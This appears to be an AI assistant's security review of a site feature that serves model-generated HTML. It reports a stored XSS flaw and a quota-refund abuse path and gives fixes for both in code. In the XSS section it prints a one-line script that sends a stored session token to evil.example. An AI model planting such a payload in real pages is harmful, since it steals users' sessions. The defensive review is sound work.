I'll review Unmarked Grave for real bugs and abuse paths only, starting with the patch and the server, client, and sandbox code.The iframe embed is safe. `sandbox="allow-scripts"` (no `allow-same-origin`) gives the frame an opaque origin, and nothing in the parent listens for `postMessage`. `[slug].ts` routing is fine: Wrangler 3.60 maps `functions/api/unmarked/play/[slug].ts` to `/api/unmarked/play/:slug`, `params.slug` is one string, and `public/_routes.json` `include: ["/api/*"]` already covers nested routes (Clicky). `_shared.ts` is not a route.

## 1. Stored XSS on the site origin

`GET /api/unmarked/play/:slug` returns model HTML as `text/html` on the game origin. The iframe `sandbox` attribute applies only while framed. "Open frame in new tab", a shared link, or a top-level visit runs that HTML as the site. `PLAY_CSP` allows inline script and does not sandbox. `connect-src 'none'` and `form-action 'none'` do not block navigation, so this exfiltrates the session:

```html
<script>location='https://evil.example/?t='+localStorage.getItem('rd_clicky_token')</script>
```

`rd_clicky_token` is in `localStorage` (`src/graves/clippy/api.ts`). `verifyToken` does not bind it to an IP, and both `/api/clicky/*` and `/api/unmarked/raise` accept `X-Clicky-Token`. The `rd_ck` cookie is `HttpOnly` and `Path=/api/clicky`, so it is not the secret being stolen. The first successful raise owns that slug forever (`INSERT OR IGNORE`), including suggestion names such as `contra`. `_headers` CSP is not applied to Function responses.

`functions/api/unmarked/_shared.ts`:

```ts
export const PLAY_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; media-src data: blob:; font-src data:; connect-src 'none'; worker-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'self'; sandbox allow-scripts";
```

Do not add `allow-same-origin`. A meta CSP cannot drop this header policy. `play/[slug].ts` must not serve a claim row:

```ts
if (!row?.html) {
  return new Response('This soul has not risen yet.', {
    status: 404,
    headers: {
      'Content-Type': 'text/plain; charset=utf-8',
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff',
    },
  });
}
```

Punctuation-only names (`!!`, `...`) all slugify to `unknown`, so one poisoned row serves every such name. Replace `slugify`:

```ts
export function slugify(name: string): string | null {
  const s = name.toLowerCase().normalize('NFKD').replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '').slice(0, 48);
  return s.length ? s : null;
}
```

In `raise.ts`: `const slug = slugify(name); if (!slug) return reply({ error: 'name' }, 400);`

## 2. Daily cap refund + stampede = unbounded Muse spend

`refund(true)` decrements `unmarked_daily.requests` and both quota rows on `bad_html`, non-200, and `fetch` failure. A refusal or a truncated page (no `</html>`, over `MAX_HTML`) is billed by Meta and then frees the slot, so one IP can loop it. The cache `SELECT` is also outside the write: parallel misses all call Muse, then `INSERT OR IGNORE` drops every body but one.

After a row with real `html` is returned as a free hit, reserve quota as now. Then:

```ts
const STALE = 90;
let upstream = false;
const claim = await db.prepare(
  `INSERT INTO unmarked_cache(slug, name, html, created) VALUES(?, ?, '', ?)
   ON CONFLICT(slug) DO UPDATE SET created = excluded.created
   WHERE unmarked_cache.html = '' AND unmarked_cache.created < excluded.created - ?
   RETURNING slug`
).bind(slug, name, now, STALE).all<{ slug: string }>();
if (!(claim.results?.length)) {
  await refund(true); // no upstream call
  const cur = await db.prepare('SELECT name, html FROM unmarked_cache WHERE slug = ?').bind(slug).first<{ name: string; html: string }>();
  if (cur?.html) return reply({ slug, name: cur.name, cached: true, remaining: await remainingFor(env, db, ipK, tokK) });
  return reply({ error: 'pending' }, 409);
}
const ac = new AbortController();
const timer = setTimeout(() => ac.abort(), 75000);
const onAbort = () => ac.abort();
request.signal.addEventListener('abort', onAbort);
try {
  upstream = true;
  const up = await fetch('https://api.meta.ai/v1/chat/completions', { /* same body */ signal: ac.signal, method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${env.MODEL_API_KEY}` } });
  if (!up.ok) throw new Error('upstream ' + up.status);
  const data = (await up.json()) as { choices?: { message?: { content?: string } }[]; usage?: { prompt_tokens?: number; completion_tokens?: number } };
  const html = extractHtml(data.choices?.[0]?.message?.content || '');
  if (!html) throw new Error('bad_html');
  const saved = await db.prepare("UPDATE unmarked_cache SET name = ?, html = ? WHERE slug = ? AND html = ''").bind(name, html, slug).run();
  await db.prepare('UPDATE unmarked_daily SET ok = ok + 1, prompt_tokens = prompt_tokens + ?, completion_tokens = completion_tokens + ? WHERE day = ?')
    .bind(data.usage?.prompt_tokens ?? 0, data.usage?.completion_tokens ?? 0, day).run();
  if (!saved.meta.changes) await refund(false); // ip+token only; daily stays
  return reply({ slug, name, cached: false, remaining: await remainingFor(env, db, ipK, tokK) });
} catch {
  await db.prepare("DELETE FROM unmarked_cache WHERE slug = ? AND html = ''").bind(slug).run();
  await refund(false); // user quota only. Leave unmarked_daily.requests consumed once fetch was attempted.
  if (!upstream) await refund(true);
  waitUntil(db.prepare('UPDATE unmarked_daily SET errors = errors + 1 WHERE day = ?').bind(day).run());
  return reply({ error: 'upstream' }, 502);
} finally {
  clearTimeout(timer);
  request.signal.removeEventListener('abort', onAbort);
}
```

Split `refund` so `refund(false)` touches only `ipK` / `tokK`. An empty fresh claim (another request is in flight) must return 409 before reserving. In `UnmarkedGrave.ts` add `pending: 'That name is already rising. Wait a few seconds and raise it again.'` to the `why` map.
